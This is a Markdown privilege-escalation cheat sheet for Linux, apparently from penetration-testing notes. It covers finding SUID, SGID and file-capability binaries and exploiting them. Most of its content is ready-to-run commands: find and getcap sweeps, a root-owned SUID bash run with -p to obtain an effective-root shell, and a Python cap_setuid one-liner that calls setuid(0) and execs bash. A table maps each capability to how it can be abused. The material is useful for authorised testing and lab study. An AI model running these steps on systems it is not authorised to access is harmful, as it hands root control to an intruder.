# SUID, SGID, and file capabilities

## Discovery
```bash
id
find / -xdev -type f -perm -4000 -exec ls -l {} \; 2>/dev/null
find / -xdev -type f -perm -2000 -exec ls -l {} \; 2>/dev/null
getcap -r /usr /opt /home 2>/dev/null
```
- `-xdev` skips other mounts. `getcap` missing from PATH: try `/usr/sbin/getcap`. No output ≠ no capabilities.

Validate a candidate:
```bash
candidate=<PATH>
resolved=$(readlink -f -- "$candidate")
stat -Lc '%A %a %U:%G %n' -- "$candidate"
file -- "$resolved"
namei -l -- "$resolved"
getcap -n "$resolved"
findmnt -T "$resolved" -o TARGET,FSTYPE,OPTIONS
grep -E '^(Uid|Gid|Cap(Inh|Prm|Eff|Bnd|Amb)|NoNewPrivs|Seccomp):' /proc/$$/status
```
- Look up the binary on GTFOBins under the SUID or Capabilities context, not Sudo.

## What changes
| Mechanism | Effect |
| --- | --- |
| SUID | Effective UID = file owner (not necessarily root) |
| SGID | Effective GID = file group |
| File capability | Specific kernel privileges only |
| Child shell | May drop the effective ID: bash `-p` keeps it |

- SUID/SGID on scripts is ignored by Linux.
- `nosuid` mount, `NoNewPrivs: 1` or tracing suppress SUID/SGID/caps.
- Do not diagnose with `strace`/debugger: tracing changes the transition.

## Root-owned SUID bash
```bash
id
stat -Lc '%A %a %U:%G %n' <PATH>
findmnt -T <PATH> -o TARGET,FSTYPE,OPTIONS
<PATH> --noprofile --norc -p -c 'printf "real UID=%s effective UID=%s\n" "$UID" "$EUID"; /usr/bin/id'
<PATH> -p
```
- Expect `real UID=1000 effective UID=0` and `euid=0(root)`; the real UID stays unchanged.
- Still your user: re-check file, owner, mount flags, `NoNewPrivs`.

## Python with `cap_setuid`
Needs `cap_setuid=ep` (also shown as `+ep`) on the resolved binary.

```bash
id
getcap -n <PATH>
findmnt -T <PATH> -o TARGET,FSTYPE,OPTIONS
<PATH> -c 'import os; print("before:", os.getuid(), os.geteuid(), flush=True); os.setuid(0); print("after:", os.getuid(), os.geteuid(), flush=True); os.execl("/usr/bin/id", "id")'
<PATH> -c 'import os; os.setuid(0); os.execl("/bin/bash", "bash", "-p")'
```
- `Operation not permitted`: check effective/bounding sets, `nosuid`, `no_new_privs`, userns UID mapping.
- Only `p` (not `e`): the interpreter must enable it first, this one-liner assumes `ep`.

## Capability → use
| Capability | Use |
| --- | --- |
| `CAP_SETUID` | Change UID (above) |
| `CAP_SETGID` | Change GID / supplementary groups; check group-owned files/services |
| `CAP_DAC_READ_SEARCH` | Read any file, traverse directories (no write) |
| `CAP_DAC_OVERRIDE` | Bypass read/write permission checks |
| `CAP_SYS_PTRACE` | Inspect/control processes (namespace and policy permitting) |
| `CAP_SYS_ADMIN` | Broad, namespace-dependent: check the operation and container context |

- The capability lives in the process that holds it: a spawned `cat` child does not inherit it.

## Misleading leads
| Finding | Meaning |
| --- | --- |
| SUID on a script | Ignored: find the interpreter/caller |
| SUID owner is another user | You get that user, not root |
| SUID utility runs but child is unprivileged | Utility or shell dropped effective IDs |
| `NoNewPrivs: 1` / `nosuid` | File-derived privilege suppressed |
| Capability but action denied | Effective/bounding sets, namespace, MAC |
| UID 0 inside a container | Root there, not on host |
| Nothing found | Check other mounts, unreadable dirs, missing getcap |

## Custom binaries / shared libraries
- Inspect `file`, `strings`, called executables, config paths; writable helpers/parents → [root-run](root-run.md).
```bash
readelf -d <PATH>
```
- Shows NEEDED libraries and RPATH/RUNPATH: check whether that location is writable.
- `LD_LIBRARY_PATH`/`LD_PRELOAD` do not work for ordinary SUID execution.
- A copied or rewritten privileged file can lose its mode or capability xattr.
